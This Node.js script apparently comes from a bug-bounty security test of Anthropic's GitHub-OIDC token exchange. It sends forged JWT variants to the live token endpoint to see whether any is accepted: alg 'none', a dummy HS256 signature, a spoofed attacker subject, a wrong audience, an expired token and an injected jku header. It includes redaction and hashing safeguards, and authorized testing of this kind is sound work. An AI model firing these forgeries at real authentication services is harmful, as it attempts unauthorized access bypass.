#!/usr/bin/env node

import { mkdir, writeFile } from "node:fs/promises";
import { createHash } from "node:crypto";

const BASE_URL = process.env.ANTHROPIC_BASE_URL || "https://api.anthropic.com";
const VERSION = process.env.ANTHROPIC_VERSION || "2023-06-01";
const AUDIENCE = process.env.INPUT_AUDIENCE || "https://api.anthropic.com";
const OUT_DIR = "evidence";

function sha256(value) {
  return createHash("sha256").update(String(value)).digest("hex");
}

function b64urlJson(value) {
  return Buffer.from(JSON.stringify(value))
    .toString("base64")
    .replaceAll("+", "-")
    .replaceAll("/", "_")
    .replaceAll("=", "");
}

function b64urlDecode(part) {
  const padded = `${part}${"=".repeat((4 - (part.length % 4)) % 4)}`;
  return Buffer.from(padded.replaceAll("-", "+").replaceAll("_", "/"), "base64").toString("utf8");
}

function decodeJwt(jwt) {
  const [headerPart, payloadPart, signaturePart = ""] = jwt.split(".");
  return {
    header: JSON.parse(b64urlDecode(headerPart)),
    payload: JSON.parse(b64urlDecode(payloadPart)),
    signature_sha256: sha256(signaturePart),
    signature_length: signaturePart.length,
  };
}

function redact(value) {
  if (Array.isArray(value)) return value.map(redact);
  if (value && typeof value === "object") {
    return Object.fromEntries(
      Object.entries(value).map(([key, child]) => {
        if (/access_token|refresh_token|authorization|api[-_]?key|secret|token|assertion/i.test(key)) {
          return [key, "[redacted:sensitive-field]"];
        }
        return [key, redact(child)];
      }),
    );
  }
  if (typeof value === "string" && /sk-ant-[A-Za-z0-9._-]+/.test(value)) {
    return "[redacted:anthropic-token]";
  }
  return value;
}

async function getGithubOidc(audience) {
  const requestUrl = process.env.ACTIONS_ID_TOKEN_REQUEST_URL;
  const requestToken = process.env.ACTIONS_ID_TOKEN_REQUEST_TOKEN;
  if (!requestUrl || !requestToken) {
    throw new Error("GitHub OIDC environment variables are missing. Check id-token: write permission.");
  }
  const url = new URL(requestUrl);
  url.searchParams.set("audience", audience);
  const res = await fetch(url, {
    headers: {
      authorization: `Bearer ${requestToken}`,
      accept: "application/json",
    },
  });
  const body = await res.json();
  if (!res.ok || typeof body.value !== "string") {
    throw new Error(`GitHub OIDC request failed: ${res.status} ${JSON.stringify(redact(body))}`);
  }
  return body.value;
}

async function parseJsonResponse(res) {
  const text = await res.text();
  const contentType = res.headers.get("content-type") || "";
  let parsed = text;
  if (contentType.includes("json")) {
    try {
      parsed = text ? JSON.parse(text) : null;
    } catch {
      parsed = text;
    }
  }
  return { text, contentType, parsed };
}

async function exchange(label, assertion, overrides = {}) {
  const body = {
    grant_type: "urn:ietf:params:oauth:grant-type:jwt-bearer",
    assertion,
    organization_id: process.env.ANTHROPIC_ORGANIZATION_ID,
    workspace_id: process.env.ANTHROPIC_WORKSPACE_ID,
    federation_rule_id: process.env.ANTHROPIC_FEDERATION_RULE_ID,
    service_account_id: process.env.ANTHROPIC_SERVICE_ACCOUNT_ID,
    ...overrides,
  };

  const res = await fetch(`${BASE_URL}/v1/oauth/token`, {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "anthropic-version": VERSION,
      "x-hackerone-handle": process.env.H1_HANDLE || "cyclopesy",
    },
    body: JSON.stringify(body),
  });
  const { text, contentType, parsed } = await parseJsonResponse(res);
  return {
    label,
    status: res.status,
    ok: res.ok,
    content_type: contentType,
    body_sha256: sha256(text),
    access_token_returned: typeof parsed?.access_token === "string",
    access_token_sha256: typeof parsed?.access_token === "string" ? sha256(parsed.access_token) : null,
    token_type: parsed?.token_type ?? null,
    expires_in: parsed?.expires_in ?? null,
    error_type: parsed?.error?.type ?? parsed?.error ?? null,
    error_message: parsed?.error?.message ?? parsed?.error_description ?? null,
    body_preview: redact(parsed),
  };
}

async function messageSmoke(label, accessToken) {
  const res = await fetch(`${BASE_URL}/v1/messages`, {
    method: "POST",
    headers: {
      "content-type": "application/json",
      "anthropic-version": VERSION,
      authorization: `Bearer ${accessToken}`,
      "x-hackerone-handle": process.env.H1_HANDLE || "cyclopesy",
    },
    body: JSON.stringify({
      model: process.env.ANTHROPIC_TEST_MODEL || "claude-haiku-4-5-20251001",
      max_tokens: 1,
      messages: [{ role: "user", content: "Reply OK." }],
    }),
  });
  const { text, contentType, parsed } = await parseJsonResponse(res);
  return {
    label,
    status: res.status,
    ok: res.ok,
    content_type: contentType,
    body_sha256: sha256(text),
    message_id: typeof parsed?.id === "string" ? parsed.id : null,
    error_type: parsed?.error?.type ?? parsed?.error ?? null,
    error_message: parsed?.error?.message ?? null,
    body_preview: redact(parsed),
  };
}

function unsignedJwtFrom(decoded, payloadOverrides = {}, headerOverrides = {}) {
  const header = { ...decoded.header, alg: "none", ...headerOverrides };
  const payload = { ...decoded.payload, ...payloadOverrides };
  return `${b64urlJson(header)}.${b64urlJson(payload)}.`;
}

function dummySignedJwtFrom(decoded, payloadOverrides = {}, headerOverrides = {}) {
  const header = { ...decoded.header, alg: "HS256", kid: "h1-dummy", ...headerOverrides };
  const payload = { ...decoded.payload, ...payloadOverrides };
  return `${b64urlJson(header)}.${b64urlJson(payload)}.${Buffer.from("dummy-signature").toString("base64url")}`;
}

function requireExchangeVars() {
  const required = [
    "ANTHROPIC_ORGANIZATION_ID",
    "ANTHROPIC_WORKSPACE_ID",
    "ANTHROPIC_FEDERATION_RULE_ID",
    "ANTHROPIC_SERVICE_ACCOUNT_ID",
  ];
  return required.filter((name) => !process.env[name]);
}

async function main() {
  await mkdir(OUT_DIR, { recursive: true });
  const jwt = await getGithubOidc(AUDIENCE);
  const decoded = decodeJwt(jwt);

  const safeClaims = {
    iss: decoded.payload.iss,
    aud: decoded.payload.aud,
    sub: decoded.payload.sub,
    repository: decoded.payload.repository,
    repository_owner: decoded.payload.repository_owner,
    repository_id: decoded.payload.repository_id,
    ref: decoded.payload.ref,
    ref_type: decoded.payload.ref_type,
    sha: decoded.payload.sha,
    workflow: decoded.payload.workflow,
    job_workflow_ref: decoded.payload.job_workflow_ref,
    event_name: decoded.payload.event_name,
    actor: decoded.payload.actor,
    actor_id: decoded.payload.actor_id,
    run_id: decoded.payload.run_id,
    run_attempt: decoded.payload.run_attempt,
  };

  const evidence = {
    generated_at: new Date().toISOString(),
    scope_asset: "api.anthropic.com / API & SDKs",
    claim_tested:
      "GitHub OIDC JWT claim collection and optional Anthropic WIF token-exchange boundary checks.",
    safety: {
      github_oidc_jwt_not_logged: true,
      github_oidc_jwt_sha256_only: sha256(jwt),
      anthopic_access_tokens_not_logged: true,
      no_third_party_data_accessed: true,
    },
    github_oidc: {
      requested_audience: AUDIENCE,
      header: decoded.header,
      signature_length: decoded.signature_length,
      signature_sha256: decoded.signature_sha256,
      safe_claims: safeClaims,
      suggested_rule_condition:
        safeClaims.repository && safeClaims.sub
          ? `repository == '${safeClaims.repository}' and sub == '${safeClaims.sub}'`
          : null,
    },
    exchange: {
      attempted: process.env.RUN_EXCHANGE === "true",
      missing_variables: requireExchangeVars(),
      results: [],
      message_smoke: null,
    },
    classification: "claims_collected_only",
  };

  if (process.env.RUN_EXCHANGE === "true") {
    if (evidence.exchange.missing_variables.length) {
      evidence.classification = "setup_incomplete_missing_anthropic_wif_variables";
    } else {
      const control = await exchange("control-real-github-oidc-jwt", jwt);
      evidence.exchange.results.push(control);
      if (control.access_token_returned) {
        // Re-exchange once for the smoke test so the bearer token stays local to this process only.
        const secondControl = await fetch(`${BASE_URL}/v1/oauth/token`, {
          method: "POST",
          headers: {
            "content-type": "application/json",
            "anthropic-version": VERSION,
            "x-hackerone-handle": process.env.H1_HANDLE || "cyclopesy",
          },
          body: JSON.stringify({
            grant_type: "urn:ietf:params:oauth:grant-type:jwt-bearer",
            assertion: jwt,
            organization_id: process.env.ANTHROPIC_ORGANIZATION_ID,
            workspace_id: process.env.ANTHROPIC_WORKSPACE_ID,
            federation_rule_id: process.env.ANTHROPIC_FEDERATION_RULE_ID,
            service_account_id: process.env.ANTHROPIC_SERVICE_ACCOUNT_ID,
          }),
        });
        const parsed = await secondControl.json();
        if (typeof parsed.access_token === "string") {
          evidence.exchange.message_smoke = await messageSmoke("control-access-token-message-smoke", parsed.access_token);
        }
      }

      const mutations = [
        ["unsigned-alg-none-same-claims", unsignedJwtFrom(decoded)],
        ["dummy-hs256-same-claims", dummySignedJwtFrom(decoded)],
        [
          "unsigned-wrong-audience",
          unsignedJwtFrom(decoded, {
            aud: "urn:h1-wrong-audience",
          }),
        ],
        [
          "unsigned-wrong-sub",
          unsignedJwtFrom(decoded, {
            sub: "repo:attacker/example:ref:refs/heads/main",
            repository: "attacker/example",
          }),
        ],
        [
          "unsigned-expired-token",
          unsignedJwtFrom(decoded, {
            iat: 1,
            nbf: 1,
            exp: 2,
          }),
        ],
        [
          "unsigned-jku-header",
          unsignedJwtFrom(decoded, {}, {
            jku: "https://example.invalid/.well-known/jwks.json",
            kid: "h1-jku-test",
          }),
        ],
      ];
      for (const [label, assertion] of mutations) {
        evidence.exchange.results.push(await exchange(label, assertion));
      }

      const acceptedMutations = evidence.exchange.results.filter(
        (item) => item.label !== "control-real-github-oidc-jwt" && item.access_token_returned,
      );
      if (!control.access_token_returned) {
        evidence.classification = "setup_failed_control_exchange_rejected";
      } else if (acceptedMutations.length) {
        evidence.classification = "candidate_critical_mutated_jwt_accepted";
      } else {
        evidence.classification = "rejected_mutated_jwts_blocked";
      }
    }
  }

  const outPath = `${OUT_DIR}/anthropic-wif-jwt-boundary-evidence.json`;
  await writeFile(outPath, `${JSON.stringify(evidence, null, 2)}\n`);
  console.log(
    JSON.stringify(
      {
        outPath,
        classification: evidence.classification,
        safe_claims: evidence.github_oidc.safe_claims,
        suggested_rule_condition: evidence.github_oidc.suggested_rule_condition,
        exchange: {
          attempted: evidence.exchange.attempted,
          missing_variables: evidence.exchange.missing_variables,
          summary: evidence.exchange.results.map((item) => ({
            label: item.label,
            status: item.status,
            access_token_returned: item.access_token_returned,
            error_type: item.error_type,
            error_message: item.error_message,
          })),
          message_smoke: evidence.exchange.message_smoke
            ? {
                status: evidence.exchange.message_smoke.status,
                ok: evidence.exchange.message_smoke.ok,
                message_id: evidence.exchange.message_smoke.message_id,
                error_type: evidence.exchange.message_smoke.error_type,
              }
            : null,
        },
      },
      null,
      2,
    ),
  );
}

main().catch((error) => {
  console.error(error instanceof Error ? error.stack || error.message : String(error));
  process.exit(1);
});
